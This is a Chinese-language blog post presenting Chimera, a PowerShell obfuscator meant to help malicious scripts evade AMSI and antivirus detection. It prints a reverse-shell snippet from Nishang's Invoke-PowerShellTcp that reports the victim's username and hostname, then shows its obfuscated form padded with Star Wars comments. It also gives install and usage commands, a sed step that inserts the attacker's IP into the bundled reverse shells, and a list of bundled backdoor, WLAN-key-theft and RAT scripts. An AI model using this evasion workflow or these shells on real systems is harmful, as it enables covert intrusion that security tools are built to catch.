![](https://image.3001.net/images/20201107/1604724616_5fa627885786af39dc366.png!small)

## Chimera

Chimera是一款针对PowerShell脚本代码的混淆工具，广大研究人员可以利用Chimera来对自己的PowerShell脚本代码进行混淆处理，并绕过目标设备的AMIS和其他反病毒解决方案。该工具可以通过字符串替换和变量连接来规避常见的签名检测，并让恶意的PowerShell脚本无法触发AV检测。

Chimera的主要目标是帮助大家更好地实现反病毒产品的恶意脚本绕过，它也进一步证明了绕过AV检测其实是非常简单的一件事情，希望Chimera能够激发社区中的各位研究人员去构建出更加健壮可靠的东西。

## Chimera运行机制

下面给出的的是Nishang的Invoke-PowerShellTcp.ps1脚本的代码段，VirusTotal的检测结果如下：

    
    
    $stream = $client.GetStream()
    
    [byte[]]$bytes = 0..65535|%{0}
    
     
    
    #Send back current username and computername
    
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    
    $stream.Write($sendbytes,0,$sendbytes.Length)
    
     
    
    #Show an interactive PowerShell prompt
    
    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
    
    $stream.Write($sendbytes,0,$sendbytes.Length)

![](https://image.3001.net/images/20201107/1604724636_5fa6279c3802440cacba3.png!small)

接下来，经过Chimera的处理之后，VirusTotal针对该脚本的混淆版本的检测结果如下：

    
    
    # Watched anxiously by the Rebel command, the fleet of small, single-pilot fighters speeds toward the massive, impregnable Death Star.
    
                  $xdgIPkCcKmvqoXAYKaOiPdhKXIsFBDov = $jYODNAbvrcYMGaAnZHZwE."$bnyEOfzNcZkkuogkqgKbfmmkvB$ZSshncYvoHKvlKTEanAhJkpKSIxQKkTZJBEahFz$KKApRDtjBkYfJhiVUDOlRxLHmOTOraapTALS"()
    
           # As the station slowly moves into position to obliterate the Rebels, the pilots maneuver down a narrow trench along the station’s equator, where the thermal port lies hidden.
    
              [bYte[]]$mOmMDiAfdJwklSzJCUFzcUmjONtNWN = 0..65535|%{0}
    
       # Darth Vader leads the counterattack himself and destroys many of the Rebels, including Luke’s boyhood friend Biggs, in ship-to-ship combat.
    
     
    
      # Finally, it is up to Luke himself to make a run at the target, and he is saved from Vader at the last minute by Han Solo, who returns in the nick of time and sends Vader spinning away from the station.
    
               # Heeding Ben’s disembodied voice, Luke switches off his computer and uses the Force to guide his aim.
    
       # Against all odds, Luke succeeds and destroys the Death Star, dealing a major defeat to the Empire and setting himself on the path to becoming a Jedi Knight.
    
               $PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK = ([teXt.enCoDInG]::AsCII)."$mbKdotKJjMWJhAignlHUS$GhPYzrThsgZeBPkkxVKpfNvFPXaYNqOLBm"("WInDows Powershell rUnnInG As User " + $TgDXkBADxbzEsKLWOwPoF:UsernAMe + " on " + $TgDXkBADxbzEsKLWOwPoF:CoMPUternAMe + "`nCoPYrIGht (C) 2015 MICrosoft CorPorAtIon. All rIGhts reserveD.`n`n")
    
    # Far off in a distant galaxy, the starship belonging to Princess Leia, a young member of the Imperial Senate, is intercepted in the course of a secret mission by a massive Imperial Star Destroyer.
    
                $xdgIPkCcKmvqoXAYKaOiPdhKXIsFBDov.WrIte($PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK,0,$PqJfKJLVEgPdfemZPpuJOTPILYisfYHxUqmmjUlKkqK.LenGth)
    
       # An imperial boarding party blasts its way onto the captured vessel, and after a fierce firefight the crew of Leia’s ship is subdued.

![](https://image.3001.net/images/20201107/1604724653_5fa627ad5e14bb1966f99.png!small)

Chimera会对脚本源代码进行多种混淆处理，transformer函数会将一个字符串分割成多个部分，并将它们重构成新的变量。

比如说，它会获取到类似“... New-Object System.Net.Sockets.TCPClient
...”这样的字符串，然后把它转换成下列形式：

    
    
    $a = "Syste"
    
    $b = "m.Net.Soc"
    
    $c = "kets.TCP"
    
    $d = "Client"
    
     
    
    ... New-Object $a$b$c$d ...

函数会将常简的数据类型和字符串转换成多个数据块，然后在对这些数据块进行串联。--level参数可以将目标字符串切分成更小的数据块和更多的变量：

    
    
    $CNiJfmZzzQrqZzqKqueOBcUVzmkVbllcEqjrbcaYzTMMd = "`m"
    
    $quiyjqGdhQZgYFRdKpDGGyWNlAjvPCxQTTbmFkvTmyB = "t`Rea"
    
    $JKflrRllAqgRlHQIUzOoyOUEqVuVrqqCKdua = "Get`s"
    
    $GdavWoszHwDVJmpYwqEweQsIAz = "ti`ON"
    
    $xcDWTDlvcJfvDZCasdTnWGvMXkRBKOCGEANJpUXDyjPob = "`L`O`Ca"
    
    $zvlOGdEJVsPNBDwfKFWpvFYvlgJXDvIUgTnQ = "`Get`-"
    
    $kvfTogUXUxMfCoxBikPwWgwHrvNOwjoBxxto = "`i"
    
    $tJdNeNXdANBemQKeUjylmlObtYp = "`AsC`i"
    
    $mhtAtRrydLlYBttEnvxuWkAQPTjvtFPwO = "`G"
    
    $PXIuUKzhMNDUYGZKqftvpAiQ = "t`R`iN

## 工具下载

广大研究人员可以使用下列命令下载和安装Chimera，并查看工具的帮助信息（已在Kali v2020.3版本上进行过测试）：

    
    
    sudo apt-get update && sudo apt-get install -Vy sed xxd libc-bin curl jq perl gawk grep coreutils git
    
    sudo git clone https://github.com/tokyoneon/chimera /opt/chimera
    
    sudo chown $USER:$USER -R /opt/chimera/; cd /opt/chimera/
    
    sudo chmod +x chimera.sh; ./chimera.sh --help

## 基本使用

    
    
    ./chimera.sh -f shells/Invoke-PowerShellTcp.ps1 -l 3 -o /tmp/chimera.ps1 -v -t powershell,windows,\
    
    copyright -c -i -h -s length,get-location,ascii,stop,close,getstream -b new-object,reverse,\
    
    invoke-expression,out-string,write-error -j -g -k -r -p

## Shells

在该工具的shells/目录下，包含了一个Nishang脚本和一些通用脚本，所有的脚本都已经经过测试并且可以正常工作。

别忘了，在使用之前我们需要修改脚本代码中硬编码的IP地址：

    
    
    sed -i 's/192.168.56.101/<YOUR-IP-ADDRESS>/g' shells/*.ps1
    
     
    
    ls -laR shells/
    
     
    
    shells/:
    
    total 60
    
    -rwxrwx--- 1 tokyoneon tokyoneon 1727 Aug 29 22:02 generic1.ps1
    
    -rwxrwx--- 1 tokyoneon tokyoneon 1433 Aug 29 22:02 generic2.ps1
    
    -rwxrwx--- 1 tokyoneon tokyoneon  734 Aug 29 22:02 generic3.ps1
    
    -rwxrwx--- 1 tokyoneon tokyoneon 4170 Aug 29 22:02 Invoke-PowerShellIcmp.ps1
    
    -rwxrwx--- 1 tokyoneon tokyoneon  281 Aug 29 22:02 Invoke-PowerShellTcpOneLine.ps1
    
    -rwxrwx--- 1 tokyoneon tokyoneon 4404 Aug 29 22:02 Invoke-PowerShellTcp.ps1
    
    -rwxrwx--- 1 tokyoneon tokyoneon  594 Aug 29 22:02 Invoke-PowerShellUdpOneLine.ps1
    
    -rwxrwx--- 1 tokyoneon tokyoneon 5754 Aug 29 22:02 Invoke-PowerShellUdp.ps1
    
    drwxrwx--- 1 tokyoneon tokyoneon 4096 Aug 28 23:27 misc
    
    -rwxrwx--- 1 tokyoneon tokyoneon  616 Aug 29 22:02 powershell_reverse_shell.ps1
    
     
    
    shells/misc:
    
    total 36
    
    -rwxrwx--- 1 tokyoneon tokyoneon 1757 Aug 12 19:53 Add-RegBackdoor.ps1
    
    -rwxrwx--- 1 tokyoneon tokyoneon 3648 Aug 12 19:53 Get-Information.ps1
    
    -rwxrwx--- 1 tokyoneon tokyoneon  672 Aug 12 19:53 Get-WLAN-Keys.ps1
    
    -rwxrwx--- 1 tokyoneon tokyoneon 4430 Aug 28 23:31 Invoke-PortScan.ps1
    
    -rwxrwx--- 1 tokyoneon tokyoneon 6762 Aug 29 00:27 Invoke-PoshRatHttp.ps1

## 工具运行演示

![](https://image.3001.net/images/20201107/1604724826_5fa6285aef21a8872e079.gif!small)

## 项目地址

Chimera：【[ _GitHub传送门_](https://github.com/tokyoneon/chimera)】

